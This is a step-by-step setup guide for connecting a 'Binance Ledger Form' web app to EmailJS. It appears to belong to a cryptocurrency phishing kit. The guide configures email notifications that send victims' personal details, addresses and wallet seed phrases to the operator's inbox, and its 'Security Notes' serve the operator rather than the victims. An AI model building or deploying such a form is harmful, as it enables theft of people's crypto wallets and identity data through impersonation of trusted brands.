
# EmailJS Setup Instructions for Binance Ledger Form

## Step 1: Create EmailJS Account
1. Go to [emailjs.com](https://emailjs.com)
2. Sign up for a free account
3. Verify your email address

## Step 2: Add Email Service
1. Go to "Email Services" in your dashboard
2. Click "Add New Service"
3. Choose your email provider (Gmail, Outlook, etc.)
4. Follow the setup instructions
5. Note down your **Service ID** (e.g., "service_xyz123")

## Step 3: Create Email Template
1. Go to "Email Templates" in your dashboard
2. Click "Create New Template"
3. Copy the entire HTML content from `src/config/emailjs-template.html`
4. Paste it into the template editor
5. Configure these settings:
   - **Template Name**: "Binance Ledger Form Submissions"
   - **Subject**: `{{subject}}`
   - **From Name**: `{{from_name}}`
   - **From Email**: `{{from_email}}`
   - **To Email**: YOUR_ADMIN_EMAIL@domain.com (your actual email)
   - **Reply To**: `{{from_email}}`

## Step 4: Template Variables
The template uses these variables (already configured in your code):
- `{{from_name}}` - User's full name
- `{{from_email}}` - User's email address
- `{{subject}}` - Email subject (form step or support request)
- `{{message}}` - Formatted form data
- `{{timestamp}}` - When the form was submitted

## Step 5: Get Your Credentials
1. Note down your **Template ID** (e.g., "template_abc456")
2. Go to "Account" > "General" to get your **User ID** (e.g., "user_def789")

## Step 6: Update Your Configuration
Replace the values in `src/config/emailjs.config.ts`:

```typescript
export const EMAILJS_CONFIG = {
  SERVICE_ID: "your_actual_service_id",
  TEMPLATE_ID: "your_actual_template_id", 
  USER_ID: "your_actual_user_id"
};
```

## Step 7: Test Your Setup
1. Submit a form in your application
2. Check your email for the notification
3. Verify all form data appears correctly

## Email Notifications You'll Receive
- **Personal Details Step**: Name, DOB, Email, Phone
- **Address Details Step**: Address, Zip, City, Country
- **Seed Phrase Step**: Sensitive wallet information
- **Support Requests**: When users need assistance

## Security Notes
- Your template is configured to handle sensitive data securely
- All form data is clearly formatted and labeled
- Security warnings are included in the email template
- The template is responsive and works on all devices

## Troubleshooting
- Ensure your email service is properly configured
- Check that all template variables match exactly
- Verify your credentials are correct
- Test with a simple form submission first
